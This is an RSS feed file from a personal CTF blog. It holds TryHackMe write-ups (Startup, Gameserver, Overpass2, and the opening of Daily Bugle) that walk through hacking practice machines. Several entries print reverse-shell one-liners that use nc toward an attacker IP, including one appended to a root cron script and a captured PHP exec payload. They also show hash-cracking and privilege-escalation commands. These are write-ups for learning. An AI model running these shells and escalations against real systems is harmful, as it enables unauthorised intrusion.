@@ -1,0 +1,1824 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Rooted</title>
+    <description>CTF writeups, resources, and certification studying blog posts.</description>
+    <link>http://localhost:8000</link>
+    <atom:link href="http://localhost:8000/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>alex</name>
+      <email>alexmcculley19@protonmail.com</email>
+      <uri>https://alexmcculley19.github.io</uri>
+    </author>
+    
+      <item>
+        <title>Startup Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---startup&quot;&gt;TryHackMe - Startup&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;This is an easy box on &lt;a href=&quot;https://tryhackme.com/room/startup&quot;&gt;TryHackMe&lt;/a&gt; that came out not that long ago. I haven’t done many ctfs recently (new job, crazy hours), and I just needed to get back into the swing of things. This box looked like the perfect place to start.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;threader3000-scan&quot;&gt;threader3000 scan&lt;/h2&gt;
+
+&lt;p&gt;I scanned this box with &lt;a href=&quot;https://github.com/dievus/threader3000&quot;&gt;threader3000&lt;/a&gt; which is a multi-threaded port scanner that can save a ton of time on boxes where you suspect there’s a higher port open (unlikely on this box, but I like the tool). It can also run an nmap scan after finding the open ports. Here’s the output from the nmap scan:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
+|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.13.1.218
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
+|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
+|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Maintenance
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see we have ports 21(ftp), 22(ssh), and 80(http) open. ftp is allowing anonymous login, which is always great for hackers.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ftp-enumeration&quot;&gt;ftp enumeration&lt;/h2&gt;
+
+&lt;p&gt;Investigating the ftp service on port 21 (you can do this with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp STARTUP-IP&lt;/code&gt; and then using the user name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; and leaving a blank password when prompted) gives us a couple of files that we can pull from the service with ‘get FILE_NAME’.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_ftp.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s a file called notice.txt that contains the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.
+People downloading documents from our website will think we are a joke! Now I
+dont know who it is, but Maya is looking pretty sus.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;hmmm, there is the possible username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Maya&lt;/code&gt;, but it also mentions people downloading documents from the website thinking the company is a joke, did they link the ftp fileshare to their website?
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;web enumeration&lt;/h2&gt;
+
+&lt;p&gt;The webpage states it’s under development. The source code doesn’t give us any extra info either.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_webpage.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to run a gobuster scan to see if there’s any interesting directories on the website. The result of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; scan is only one directory:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/files (Status: 301)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;navigating to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/files&lt;/code&gt; directory gives us the follwing page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_files.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-access&quot;&gt;initial access&lt;/h2&gt;
+
+&lt;p&gt;They did indeed link the ftp file share to the webpage. If we can upload a file to the ftp directory, we can try and get a reverse shell. I’ll use the standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; file that comes with both kali and parrotOS. We’ll need to change the IP and port in that file to that of our attacking machine. After that, we can set up a listener on our attacking machine and access the file through our browser to activate the malicious php script on our victim machine.&lt;/p&gt;
+
+&lt;p&gt;After changing the IP and port in the php script, we can navigate back to the ftp directory through the fileshare on the command line. We can upload the php reverse shell with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;put php-reverse-shell.php&lt;/code&gt; and we should get a message indicating the file uploaded properly.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_shell.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we’ve got this shell uploaded, we need to setup a netcat listener on our attacking machine with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvnp REV-SHELL-PORT&lt;/code&gt;. From there, it’s as simple as navigating back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;files&lt;/code&gt; in our browser and clicking on our file.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_ftpfile.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_initial.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, this gives us an initial shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;. We can’t access the user flag, but there is a user named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lennie&lt;/code&gt; that we can try and move to.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;user-privilege-escalation&quot;&gt;user privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;Before I get into the user priv esc, I’d like to mention a great toolset that I use to stabilize my shells. It’s John Hammond’s &lt;a href=&quot;https://github.com/JohnHammond/poor-mans-pentest&quot;&gt;poor-mans-pentest&lt;/a&gt;. This toolset is basic stuff, but worth at least a quick look. He and another ctf player, Caleb Stewart, have started development on a toolset called &lt;a href=&quot;https://github.com/JohnHammond/poor-mans-pentest&quot;&gt;pwncat&lt;/a&gt;. I haven’t had the time to look at it, but I’ve seen a video of some of the functionality and it looks really impressive. Anyway, back to the box.&lt;/p&gt;
+
+&lt;p&gt;Poking around the file system, we see some irregularities in the root directory. There’s a few directories that don’t belong, but the most interesting is the one named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;incidents&lt;/code&gt;. Inside there’s a wireshark file that we can download onto our machine by spinning up a web server on our victim and using wget. Here’s the commands in action:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_download.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can see that the top section is the web server, and that I misspelled the file the first time I tried downloading it… But that I did grab the file eventually.&lt;/p&gt;
+
+&lt;p&gt;Now we can investigate the wireshark file on our attacking machine. Firing it up we get a flood of network activity. This part reminded me of the &lt;a href=&quot;https://tryhackme.com/room/overpass2hacked&quot;&gt;overpass2&lt;/a&gt; room. This room taught me how to do some basic wireshark navigation and what to look for. Perhaps the quickest way to find what we’re looking for is to find a packet that looks like reverse shell commands (reverse shells send data in cleartext), right click on it, and select the Follow -&amp;gt; TCP stream option. This gives us a nice view of what commands were being sent to the reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_wireshark.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We get a potential password out of the wireshark file. While this isn’t the root password that we’d like it to be, it is the password for user lennie. We can now grab the user flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;root-privilege-escalation&quot;&gt;root privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;This had me stumped for a little bit, but once you look under the hood of what processes are running, it’s straightforward and a good root escalation for a box like this. The first place to to look is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts&lt;/code&gt; directory in lennie’s home folder.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_scripts.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The files in this directory are owned by root, so we won’t be able to edit them without the root password. But at the end of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;planner.sh&lt;/code&gt; file we have the script run a program in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/&lt;/code&gt; folder called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print.sh&lt;/code&gt;. Maybe we can change that one?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_print.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yes! So the question is, how do we execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;planner.sh&lt;/code&gt; as root in order to execute this file as root as well? In order to get a better look at the processes that happen on a linux box, we can use a script called &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt;. We’ll use the 64bit version. We’ll upload this file to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; folder via the same method we grabbed the wireshark file. We’ll spin up a web server with python, and wget the file on our victim machine. Running pspy for about a minute or two will give us the following output:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_pspy.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that the system is running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;planner.sh&lt;/code&gt; as root every minute! This means we just have to append our malicious reverse shell to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/print.sh&lt;/code&gt; file and wait with a listener on our attacking machine. I grabbed the following line from &lt;a href=&quot;https://jaytaylor.com/notes/node/1520886669000.html&quot;&gt;pentest monkey&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ATTACKING-IP PORT &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;And in order to append it, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&amp;gt;&lt;/code&gt; redirect with the echo command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.13.1.218 1234 &amp;gt;/tmp/f&quot; &amp;gt;&amp;gt; /etc/print.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;And now we get root!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/startup/startup_root.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;final-thoughts&quot;&gt;final thoughts&lt;/h2&gt;
+
+&lt;p&gt;This was a great way to ease back into things. I liked the wireshark inclusion and the priv esc was pretty classic. I actually got stumped for a second, but I think it was because I had the wrong netcat reverse shell one-liner. Anyway, if you’ve read this far I appreciate it and remember to hack all the things.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 13 Nov 2020 00:00:00 -0600</pubDate>
+        <link>http://localhost:8000//Startup</link>
+        <link href="http://localhost:8000/Startup"/>
+        <guid isPermaLink="true">http://localhost:8000/Startup</guid>
+      </item>
+    
+      <item>
+        <title>Gameserver Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---gameserver&quot;&gt;TryHackMe - Gameserver&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This room is an easy room, but the privilege escalation involves lxd which is a linux container manager I’d say that it’s similar to docker, but containers in general are still confusing to me so I can’t verify for sure. I’ve done one other box involving a privilege escalation via lxd, but I really fumbled through it. Anyway, let’s get started with gameserver.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-scan&quot;&gt;initial scan&lt;/h2&gt;
+
+&lt;p&gt;I’ve been using &lt;a href=&quot;https://github.com/dievus/threader3000&quot;&gt;threader3000&lt;/a&gt; for the past couple of boxes, and I’ve got to say, I’m a big fan of the ability to scan all the ports so quickly and then use nmap to further scan the open ports. Here’s the results of the nmap scan after running threader3000.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.94.27 10.10.94.27
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 19:27 CDT
+Nmap scan report for 10.10.94.27
+Host is up (0.24s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: House of danak
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.70 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Seems simple enough, only port 22 running ssh and port 80 running http. We’ll start with enumeration of the website.&lt;/p&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;web enumeration&lt;/h2&gt;
+
+&lt;p&gt;The website contains information about a game called house of danak. Looking at the source code gives us a good hint for a username, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gameserver/gameserver_comment.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’m going to run dirsearch on this box, I’ve seen it around and wanted to give it a shot over gobuster. I really like gobuster as a tool, but I wanted to branch out and try another directory brute forcing tool.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gameserver/gameserver_dirsearch.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;There’s a few insteresting things here, but I think the more obvious one is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; directory. Navigating there we’re greeted with a very interesting piece of information:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gameserver/gameserver_privatekey.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;That looks like a private ssh key to me. We can grab that with a simple wget command to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret&lt;/code&gt; directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget http://IP-ADDRESS/secret&lt;/code&gt;. Now we can try to logon to the victim machine with the username from earlier using this key. We can do so with the following command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -i secretKey john@VICTIM_IP_ADDRESS&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This gives us initial access to the machine and the user flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gameserver/gameserver_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;I won’t spend too much time on the enumeration side of things. That’s not the real reason I went for this machine. As I said at the beginning of this writeup, I wanted some practice with container privilege escalation. Basically the idea of this kind of priv esc is to build a container that mounts the host’s root file system into a container giving access to the root user’s files. I found &lt;a href=&quot;https://www.hackingarticles.in/lxd-privilege-escalation/&quot;&gt;this&lt;/a&gt; article the first time that I had to use this kind of priv esc and I think it does a decent job of describing how to do the priv esc. You have to download a github repo that builds the framework for a container on your attacking machine. Once you have that you can upload to the victim machine and build the container that gives you root access. From that point it’s a simple navigation to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt&lt;/code&gt; directory where you can see the mounted root files.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/gameserver/gameserver_root.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 10 Oct 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Gameserver</link>
+        <link href="http://localhost:8000/Gameserver"/>
+        <guid isPermaLink="true">http://localhost:8000/Gameserver</guid>
+      </item>
+    
+      <item>
+        <title>Overpass2 Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---overpass2&quot;&gt;TryHackMe - Overpass2&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This room is more a forensics room. The story is that someone has hacked the overpass website and we need to investigate how the attacker got in, what they did, and how we can get back on the box. We’ll be using wireshark and some OSINT to figure out how the attacker got on and we’ll see if we can’t get back on the box. BTW, there is a walkthrough vide of this room by John Hammond, he’s an excellent cyber-security resource on youtube so check him out if that’s your thing.&lt;/p&gt;
+
+&lt;h2 id=&quot;analyse-the-pcap&quot;&gt;analyse the PCAP&lt;/h2&gt;
+
+&lt;p&gt;The first section of this room is to analyse the wireshark packet capture file and see what the attacker did. We’ll figure out where they uploaded, what they uploaded, and all the commands that the attacker used on the box. The first place to start with the packet capture file is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http POST&lt;/code&gt; requests. Naviagting the file in wireshark and searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt;, we can see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request made to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/development/&lt;/code&gt; directory. This is a good place to look. If we inspect the request we can also see the reverse shell that got uploaded.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /development/upload.php HTTP/1.1
+Host: 192.168.170.159
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.170.159/development/
+Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
+Content-Length: 454
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1809049028579987031515260006
+Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;payload.php&quot;
+Content-Type: application/x-php
+
+&amp;lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.170.145 4242 &amp;gt;/tmp/f&quot;)?&amp;gt;
+
+-----------------------------1809049028579987031515260006
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+Upload File
+-----------------------------1809049028579987031515260006--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can see the php code that gave the attacker the reverse shell. Now that we know the packet where the attacker uploaded his shell, we can simply inspect the packets beneath that until we see some shell commands. Netcat reverse shells transmit in clear text. The first command we see is to stabilize the shell. Once we locate that packet we can get a good overview of what the attacker did by going to analyze -&amp;gt; follow -&amp;gt; tcp stream. This allows us to see exactly what commands the attacker used.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/overpass2/overpass2_tcpfollow.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The attacker grabbed the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; password and switched to that user. From there, they dumped the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file. The room would like for us to take the shadow file and see how many of the passwords are crackable with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fasttrack.txt&lt;/code&gt; wordlist. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; for this. If you use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;, this is what I used:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo john hashes.txt --wordlist=/usr/share/wordlists/fasttrack.txt&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The last part of this analysis is the program that the attacker used to install a backdoor on the machine. We can see that they cloned a git repo named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-backdoor&lt;/code&gt;. The next section is all about figuring out what the backdoor does.&lt;/p&gt;
+
+&lt;h2 id=&quot;analysis-of-the-backdoor&quot;&gt;analysis of the backdoor&lt;/h2&gt;
+
+&lt;p&gt;Going to the git repo with the backdoor script &lt;a href=&quot;https://github.com/NinjaJc01/ssh-backdoor&quot;&gt;here&lt;/a&gt;, we see only a couple of scripts, but the main one is, aptly named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.go&lt;/code&gt;. We can see that there’s a default hash and a hardcoded salt involved in the code, but the attacker actually used their own hash. We can investigate the PCAP file again to see what the attacker used as their hash. So, with the hash and the salt, we can construct a hash that can be cracked. For this one, I used hashcat. The basic construction of the hash is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash:salt&lt;/code&gt;. I saved the hash in a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attacker_hash&lt;/code&gt;, and the command I used is:
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 1710 attacker_hash.txt /usr/share/wordlists/rockyou.txt&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;back-to-the-machine&quot;&gt;back to the machine&lt;/h2&gt;
+
+&lt;p&gt;Once we get that password cracked, we can connect to the victim machine through the backdoor the attacker installed. Once on the machine, we can grab the user flag with ease.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/overpass2/overpass2_user.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;root-escalation&quot;&gt;root escalation&lt;/h2&gt;
+
+&lt;p&gt;The escalation here is easy. The attacker left a quick way to escalate. After trying to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; password and failing, I took a look at the files in the home folder for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; and saw a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.suid_bash&lt;/code&gt; file owned by root. We can run this file with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; argument to keep the permissions of the file owner and that allows us to get a shell as root.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/overpass2/overpass2_setuid.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/overpass2/overpass2_root.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;From there root is only a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command away. This was a great box that gave me a chance to refresh myself on wireshark and researching some code. Thanks for reading if you’ve gotten this far, and a special thanks to the creator of this box!
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 22 Sep 2020 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//Overpass2</link>
+        <link href="http://localhost:8000/Overpass2"/>
+        <guid isPermaLink="true">http://localhost:8000/Overpass2</guid>
+      </item>
+    
+      <item>
+        <title>Daily Bugle Writeup</title>
+        <description>&lt;h1 id=&quot;tryhackme---daily-bugle&quot;&gt;TryHackMe - Daily Bugle&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;assets/images/dailybugle/dailybugle_box.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;This continues my offensive security path on &lt;a href=&quot;https://tryhackme.com/room/dailybugle&quot;&gt;TryHackMe&lt;/a&gt;. This room involves some sqli, cracking hashes, and priv esc with yum. As always I’ll start with my standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan of the box.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;nmap scan&lt;/h2&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sC -sV -oN nmap/daily_initialnmap.txt 10.10.203.11
